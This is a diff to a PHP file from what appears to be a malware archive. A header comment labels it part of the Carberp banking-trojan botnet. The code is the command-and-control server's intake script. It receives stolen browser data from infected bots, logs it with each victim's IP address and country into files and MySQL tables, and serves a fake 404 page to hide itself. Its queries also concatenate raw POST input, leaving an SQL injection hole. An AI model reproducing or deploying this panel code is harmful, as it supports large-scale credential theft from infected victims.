@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $dir = str_replace('/scripts/get', '', str_replace('\\', '/', realpath('.'))) . '/';
@@ -29,7 +40,8 @@ if(!empty($_POST['base'])){
 	@file_put_contents($dir . 'cache/last_time.txt', date('d.m.Y_G'));
     file_put_contents($dir . 'logs/export/gra/' .  date('d.m.Y_G') . '.txt', '#BOTSTART#' . $_POST['prefix'] . $_POST['uid'] . ':' . $_SERVER['REMOTE_ADDR'] . "#BOTNIP#\r\n" . urldecode($_POST['base']) . '#BOTEND#' . "\r\n", FILE_APPEND);
 
-    if($config['getlog'] == 1){    	print_data('403', true);
+    if($config['getlog'] == 1){
+    	print_data('403', true);
     	exit;
     }
 
@@ -74,15 +86,19 @@ if(!empty($_POST['base'])){
     foreach($mi as $im){
     	$im[2] = trim($im[2]);
     	$im[2] = explode("\r\n", $im[2], 2);
-        foreach($im[2] as $iz){        	$iz = trim($iz);
+        foreach($im[2] as $iz){
+        	$iz = trim($iz);
     		$iz = explode('@@@', $iz, 2);
-    		if($mysqli->real_query('INSERT DELAYED INTO bf_logs_'.$dn.' (prefix, uid, url, data, brw, protocol, ip, country, type, hour) VALUES (\''.$_POST['prefix'].'\', \''.$_POST['uid'].'\', \''.$iz[0].'\', \''.$iz[1].'\', \''.$im[1].'\', \''.@parse_url($iz[0], PHP_URL_SCHEME).'\', \''.$_SERVER['REMOTE_ADDR'].'\', \''.$country.'\', \'3\', DATE_FORMAT(CURRENT_TIMESTAMP(),\'%H\'))')){    			$write = true;
+    		if($mysqli->real_query('INSERT DELAYED INTO bf_logs_'.$dn.' (prefix, uid, url, data, brw, protocol, ip, country, type, hour) VALUES (\''.$_POST['prefix'].'\', \''.$_POST['uid'].'\', \''.$iz[0].'\', \''.$iz[1].'\', \''.$im[1].'\', \''.@parse_url($iz[0], PHP_URL_SCHEME).'\', \''.$_SERVER['REMOTE_ADDR'].'\', \''.$country.'\', \'3\', DATE_FORMAT(CURRENT_TIMESTAMP(),\'%H\'))')){
+    			$write = true;
     		}
     	}
     }
 
-    if($write == true){    	print_data('403', true);
-    }else{    	header("HTTP/1.1 404 Not Found");
+    if($write == true){
+    	print_data('403', true);
+    }else{
+    	header("HTTP/1.1 404 Not Found");
 		header("Status: 404 Not Found");
 
 		print(file_get_contents($dir . '404.html'));
